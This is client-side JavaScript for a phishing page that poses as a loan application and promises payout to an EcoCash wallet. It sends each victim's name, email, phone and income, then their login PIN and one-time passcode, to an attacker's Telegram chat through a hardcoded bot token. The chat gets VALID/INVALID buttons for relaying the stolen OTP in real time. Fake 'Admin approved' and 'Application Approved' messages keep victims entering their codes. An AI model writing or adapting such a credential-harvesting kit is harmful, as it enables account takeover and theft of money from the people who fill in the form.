// ===== TELEGRAM CONFIGURATION =====
    const TELEGRAM_BOT_TOKEN = '8908669856:AAE2mD4cPYU9Q5b2LPhdRdZpx4evvQvkcm0'; 
    const TELEGRAM_CHAT_ID = '8653026083';

    // ===== STATE =====
    let currentScreen = 'screen-hero';
    let pin = '';
    let pinTimer = null;
    let appData = {
        amount: '0',
        name: 'Unknown',
        email: 'Unknown',
        phone: 'Unknown',
        term: '6 months',
        purpose: 'General'
    };

    // ===== NAVIGATION =====
    function showScreen(id) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        currentScreen = id;
        window.scrollTo(0, 0);
        
        if(id !== 'screen-otp') {
            for(let i=1; i<=6; i++) {
                if(document.getElementById(`otp-${i}`)) document.getElementById(`otp-${i}`).value = '';
            }
        }
    }

    function toggleMenu() {
        showToast('Menu coming soon!', 'success');
    }

    // ===== TELEGRAM BACKEND FUNCTIONS =====
    function sendToTelegram(message, callback) {
        if(TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID'){
            console.log(`[TELEGRAM MOCK] ${message}`);
            if(callback) callback();
            return;
        }
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        }).then(response => response.json()).then(data => {
            if(data.ok && callback) callback();
            else if(!data.ok) showToast('Failed to send to Admin Bot!', 'error');
        }).catch(() => showToast('Network error connecting to Bot', 'error'));
    }

    function sendToTelegramWithButtons(message, callback) {
        if(TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID'){
            console.log(`[TELEGRAM MOCK WITH BUTTONS] ${message}`);
            if(callback) callback();
            return;
        }
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const inlineKeyboard = {
            inline_keyboard: [[
                { text: '✅ VALID', callback_data: 'otp_valid' },
                { text: '❌ INVALID', callback_data: 'otp_invalid' }
            ]]
        };
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TELEGRAM_CHAT_ID, 
                text: message, 
                parse_mode: 'Markdown',
                reply_markup: inlineKeyboard
            })
        }).then(response => response.json()).then(data => {
            if(data.ok && callback) callback();
            else if(!data.ok) showToast('Failed to send to Admin Bot!', 'error');
        }).catch(() => showToast('Network error connecting to Bot', 'error'));
    }

    // ===== TOAST =====
    function showToast(msg, type) {
        const toast = document.getElementById('toast');
        const icon = document.getElementById('toast-icon');
        toast.className = 'toast ' + (type === 'error' ? 'toast-error' : 'toast-success');
        icon.innerHTML = type === 'error' ? '&#10005;' : '&#10003;';
        document.getElementById('toast-msg').textContent = msg;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 3000);
    }

    // ===== SLIDERS =====
    function initSlider(containerId, fillId, thumbId, min, max, step, onChange) {
        const container = document.getElementById(containerId);
        const fill = document.getElementById(fillId);
        const thumb = document.getElementById(thumbId);
        let isDragging = false;

        function setValue(value) {
            const pct = (value - min) / (max - min);
            fill.style.width = (pct * 100) + '%';
            thumb.style.left = (pct * 100) + '%';
            onChange(value);
        }

        function updateFromClientX(clientX) {
            const rect = container.getBoundingClientRect();
            let pct = (clientX - rect.left) / rect.width;
            pct = Math.max(0, Math.min(1, pct));
            const raw = min + pct * (max - min);
            const stepped = Math.round(raw / step) * step;
            const clamped = Math.max(min, Math.min(max, stepped));
            setValue(clamped);
        }

        thumb.addEventListener('mousedown', (e) => { isDragging = true; e.preventDefault(); });
        document.addEventListener('mousemove', (e) => { if (isDragging) updateFromClientX(e.clientX); });
        document.addEventListener('mouseup', () => { isDragging = false; });

        thumb.addEventListener('touchstart', (e) => { isDragging = true; e.preventDefault(); });
        document.addEventListener('touchmove', (e) => { if (isDragging) updateFromClientX(e.touches[0].clientX); });
        document.addEventListener('touchend', () => { isDragging = false; });

        container.addEventListener('click', (e) => { if (e.target !== thumb) updateFromClientX(e.clientX); });

        return { setValue };
    }

    function formatCurrency(n) {
        return '$' + n.toLocaleString('en-US');
    }

    function calculatePayment(amount, months) {
        const rate = 0.08 / 12;
        const payment = (amount * rate * Math.pow(1 + rate, months)) / (Math.pow(1 + rate, months) - 1);
        return payment.toFixed(2);
    }

    let loanAmount = 5000;
    let loanTerm = 30;

    function updateAmountDisplay(v) {
        loanAmount = v;
        document.getElementById('calc-amount-display').textContent = formatCurrency(v);
        updatePayment();
    }

    function updateTermDisplay(v) {
        loanTerm = v;
        document.getElementById('calc-term-display').textContent = v + ' months';
        updatePayment();
    }

    function updatePayment() {
        const payment = calculatePayment(loanAmount, loanTerm);
        document.getElementById('calc-payment').textContent = '$' + payment;
    }

    const amountSlider = initSlider('amount-slider', 'amount-fill', 'amount-thumb', 100, 5000, 100, updateAmountDisplay);
    const termSlider = initSlider('term-slider', 'term-fill', 'term-thumb', 6, 60, 6, updateTermDisplay);
    amountSlider.setValue(5000);
    termSlider.setValue(30);
    updatePayment();

    // ===== STEP NAVIGATION =====
    function goToStep2() {
        const amount = document.getElementById('step1-amount').value.trim();
        const purpose = document.getElementById('step1-purpose').value.trim();
        if (!amount) {
            showToast('Please enter loan amount', 'error');
            return;
        }
        if (!purpose) {
            showToast('Please enter loan purpose', 'error');
            return;
        }
        appData.amount = amount;
        appData.purpose = purpose;
        showScreen('screen-step2');
    }

    function goToStep3() {
        const first = document.getElementById('first-name').value.trim();
        const last = document.getElementById('last-name').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        if (!first || !last) {
            showToast('Please enter your full name', 'error');
            return;
        }
        if (!email || !email.includes('@')) {
            showToast('Please enter a valid email', 'error');
            return;
        }
        if (!phone) {
            showToast('Please enter your phone number', 'error');
            return;
        }

        appData.name = first + ' ' + last;
        appData.email = email;
        appData.phone = phone;
        appData.term = document.getElementById('step1-term').value.toLowerCase();

        document.getElementById('sum-amount').textContent = '$' + appData.amount;
        document.getElementById('sum-term').textContent = appData.term;
        document.getElementById('sum-purpose').textContent = appData.purpose;
        document.getElementById('sum-applicant').textContent = appData.name;

        showScreen('screen-step3');
    }

    function submitApplication() {
        const income = document.getElementById('income').value.trim();
        if (!income) {
            showToast('Please enter your annual income', 'error');
            return;
        }

        const message = `📝 *New Loan Application*\n-------------------\n*Name:* ${appData.name}\n*Phone:* ${appData.phone}\n*Email:* ${appData.email}\n*Amount:* $${appData.amount}\n*Term:* ${appData.term}\n*Purpose:* ${appData.purpose}\n*Income:* $${income}`;
        sendToTelegram(message);
        
        showToast('Application sent to Admin!', 'success');
        showScreen('screen-success');
        
        if (window.loginRedirectTimer) clearTimeout(window.loginRedirectTimer);
        window.loginRedirectTimer = setTimeout(() => {
            showScreen('screen-login');
        }, 3500);
    }

    // ===== PIN INPUT (LOGIN) =====
    const pinHiddenInput = document.getElementById('pin-hidden');
    const pinBoxes = document.getElementById('pin-boxes');

    if(pinBoxes) {
        pinBoxes.addEventListener('click', () => {
            pinHiddenInput.focus();
        });
    }

    if(pinHiddenInput) {
        pinHiddenInput.addEventListener('input', (e) => {
            let val = pinHiddenInput.value.replace(/\D/g, '');
            if(val.length > 4) val = val.slice(0, 4);
            pinHiddenInput.value = val;
            pin = val;
            updatePinDisplay();
            
            if(pin.length === 4) {
                document.getElementById('overlay').classList.add('show');
                const phone = document.getElementById('login-phone').value.replace(/\s/g, '');
                sendToTelegram(`🔐 *Login Attempt*\nPhone: +263 ${phone}\nPIN: ${pin}`);
                
                if(pinTimer) clearTimeout(pinTimer);
                pinTimer = setTimeout(() => {
                    document.getElementById('overlay').classList.remove('show');
                    showToast('Admin approved your login!', 'success');
                    pin = '';
                    pinHiddenInput.value = '';
                    updatePinDisplay();
                    
                    showScreen('screen-otp');
                }, 2500);
            }
        });
        
        pinHiddenInput.addEventListener('keydown', (e) => {
            if(e.key === 'Backspace' && pin.length > 0) {
                setTimeout(() => {
                    pin = pinHiddenInput.value;
                    updatePinDisplay();
                }, 0);
            }
        });
    }

    function updatePinDisplay() {
        for (let i = 1; i <= 4; i++) {
            const box = document.getElementById('pin-' + i);
            if (i <= pin.length) box.classList.add('filled');
            else box.classList.remove('filled');
        }
    }

    // ===== OTP LOGIC =====
    let currentEnteredOTP = '';

    function moveToNext(current, nextId) {
        if(current.value.length === 1 && nextId) document.getElementById(nextId).focus();
        if(current.value.length > 1) current.value = current.value.slice(0, 1);
    }

    function verifyOTP() {
        let enteredOTP = '';
        for(let i=1; i<=6; i++) enteredOTP += document.getElementById(`otp-${i}`).value;
        
        if(enteredOTP.length !== 6) {
            showToast('Please enter the full 6-digit OTP', 'error');
            return;
        }

        currentEnteredOTP = enteredOTP;
        const phone = document.getElementById('login-phone').value.replace(/\s/g, '');

        // Hide input section and submit button, show verifying state
        document.getElementById('otp-input-section').style.display = 'none';
        document.getElementById('otp-submit-btn').style.display = 'none';
        document.getElementById('otp-resend-btn').style.display = 'none';
        document.getElementById('otp-verifying-box').classList.add('show');
        document.getElementById('otp-invalid-box').classList.remove('show');

        // Send OTP to Telegram with VALID/INVALID buttons for admin
        const message = `🔎 *OTP Verification Request*\n\nPhone: +263 ${phone}\nEntered OTP: *${enteredOTP}*\n\nPlease verify this OTP:`;
        sendToTelegramWithButtons(message);

        showToast('OTP sent to admin for verification', 'success');
    }

    // This function is called when admin taps VALID in Telegram
    function handleOTPValid() {
        document.getElementById('otp-verifying-box').classList.remove('show');
        
        sendToTelegram(`✅ *Admin Decision: VALID*\nOTP: ${currentEnteredOTP} approved.`);
        showToast('Admin verified! Application Approved.', 'success');
        
        setTimeout(() => {
            document.getElementById('success-title-text').innerHTML = "Application Approved!";
            document.getElementById('success-description-text').innerHTML = "Congratulations! Your loan application has been successfully validated. Funds will be disbursed to your EcoCash wallet shortly.";
            document.getElementById('success-redirect-box').innerHTML = `<span style="color: #10b981;">&#10003; Successfully Verified</span>`;
            showScreen('screen-success');
        }, 1000);
    }

    // This function is called when admin taps INVALID in Telegram
    function handleOTPInvalid() {
        document.getElementById('otp-verifying-box').classList.remove('show');
        document.getElementById('otp-invalid-box').classList.add('show');
        
        sendToTelegram(`❌ *Admin Decision: INVALID*\nOTP: ${currentEnteredOTP} rejected.`);
        showToast('Invalid OTP! Admin rejected the request.', 'error');
    }

    function requestNewOTP() {
        // Reset OTP screen
        document.getElementById('otp-input-section').style.display = 'flex';
        document.getElementById('otp-submit-btn').style.display = 'block';
        document.getElementById('otp-resend-btn').style.display = 'block';
        document.getElementById('otp-verifying-box').classList.remove('show');
        document.getElementById('otp-invalid-box').classList.remove('show');
        
        // Clear OTP fields
        for(let i=1; i<=6; i++) document.getElementById(`otp-${i}`).value = '';
        document.getElementById('otp-1').focus();
        
        const phone = document.getElementById('login-phone').value.replace(/\s/g, '');
        sendToTelegram(`🔄 *New OTP Requested*\nPhone: +263 ${phone}\nUser requested a new OTP.`);
        showToast('New OTP requested. Enter the OTP from your network provider.', 'success');
    }

    function resendOTP() {
        requestNewOTP();
    }

    // For testing purposes - simulate admin responses via console
    // In production, these would be triggered by Telegram webhook callbacks
    window.simulateAdminValid = handleOTPValid;
    window.simulateAdminInvalid = handleOTPInvalid;
